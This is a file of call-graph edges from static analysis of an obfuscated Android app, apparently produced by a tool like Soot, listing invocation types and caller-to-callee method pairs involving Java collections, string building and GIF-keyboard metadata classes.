VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: int size()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gbk: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lrg: void <init>(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: int hashCode()>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 1) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getValue()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <mij: void <init>(miy)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>($r2, $l0) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)> ==> <j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(7) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: staticinvoke <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>($r2, $r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>
SPECIAL edge: specialinvoke $r9.<lwk: void <init>()>() in <lwf: void <clinit>()> ==> <lwk: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r4.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <liy: void <init>(ljd)> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lql: int size()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorCategoryMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lma: int e(int)>
STATIC edge: $r3 = staticinvoke <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>($r2, $r6) in <llg: java.lang.Object next()> ==> <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int,int)>(0, $i0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int,int)>
STATIC edge: $z1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r3, $i2, $r6) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r9.<java.lang.StringBuilder: void <init>()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lkh: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <lri: boolean j(java.util.Set,java.lang.Object)>(r0, $r1) in <lma: boolean equals(java.lang.Object)> ==> <lri: boolean j(java.util.Set,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r5, 0, $r6, 6, $i1) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("at index ") in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <ljf: void <init>()> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljf: int b()> ==> <izw: java.lang.Object al(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: int ae(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $i0 = staticinvoke <izw: int ae(int)>($i0) in <izw: int ak(int)> ==> <izw: int ae(int)>
SPECIAL edge: specialinvoke $r0.<ldr: void <init>()>() in <ldr: void <clinit>()> ==> <ldr: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljd: int z(int,int,int,int)> ==> <izw: int af(int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: staticinvoke <lri: void v(java.lang.Object[],int)>($r0, $i0) in <lri: void u(java.lang.Object[])> ==> <lri: void v(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(2) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lql: int size()>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <liz: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.Throwable getCause()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lkq: int size()>() in <lqs: int size()> ==> <lql: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Class forName(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: java.lang.Object[] n()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("<") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>("cannot read from empty metadata") in <ltr: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
SPECIAL edge: $r1 = specialinvoke r0.<lkt: lkx b(boolean)>(1) in <lkt: lkx l()> ==> <lkt: lkx b(boolean)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(axu,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r7.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i4, $r0, $i0, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r9.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r7) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(int[],int[])>($r8, $r9) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(int[],int[])>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lql: int size()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <lri: int b(java.util.Set)> ==> <lsb: java.lang.Object next()>
CLINIT edge: staticinvoke <lum: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lum: void <clinit>()>
VIRTUAL edge: $r6 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqs: lsa l()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
CLINIT edge: staticinvoke <java.lang.System: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.System: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: int hashCode()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Map: int size()>() in <ljd: int size()> ==> <java.util.HashMap: int size()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.String X(int,int,java.lang.String)>($i1, $i0, "index") in <iye: void Q(int,int)> ==> <iye: java.lang.String X(int,int,java.lang.String)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.util.Map o()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(2) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r14 = virtualinvoke $r7.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c2) in <ivw: boolean s(java.lang.String)> ==> <ivw: boolean O(char)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.w: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.w: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lqr: int hashCode()>
CLINIT edge: staticinvoke <androidx.core.content.FileProvider: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <androidx.core.content.FileProvider: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAutocompleteMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: java.util.Iterator iterator()> ==> <lqs: lsa l()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.util.Map m()> ==> <ljd: int e()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <nzh: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.util.Iterator iterator()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r2.<nzh: void <init>()>() in <ivv: void <init>(byte[])> ==> <nzh: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: int size()>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int length()>() in <ivv: void g(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r5 = staticinvoke <lqd: lqd b(java.util.Comparator)>($r4) in <lmb: lme f()> ==> <lqd: lqd b(java.util.Comparator)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkq: int size()>() in <lkq: int hashCode()> ==> <lql: int size()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljf: void q(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.LinkageError: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r24) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: $r2 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getValue()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.sun.misc.b: void <init>(sun.misc.Unsafe)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "maxDepth must be > 0 or -1") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb B()>() in <lkq: java.util.Iterator iterator()> ==> <lkq: lsb B()>
CLINIT edge: staticinvoke <lkh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkh: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r8.<lme: lma d(java.lang.Object)>($r13) in <hbv: void j()> ==> <lme: lma d(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq h(java.lang.Object[],int)> ==> <lql: void <init>(java.lang.Object[],int)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r1.<lnc: void <init>(java.lang.Object)>($r0) in <izw: lsa w(java.lang.Object)> ==> <lnc: void <init>(java.lang.Object)>
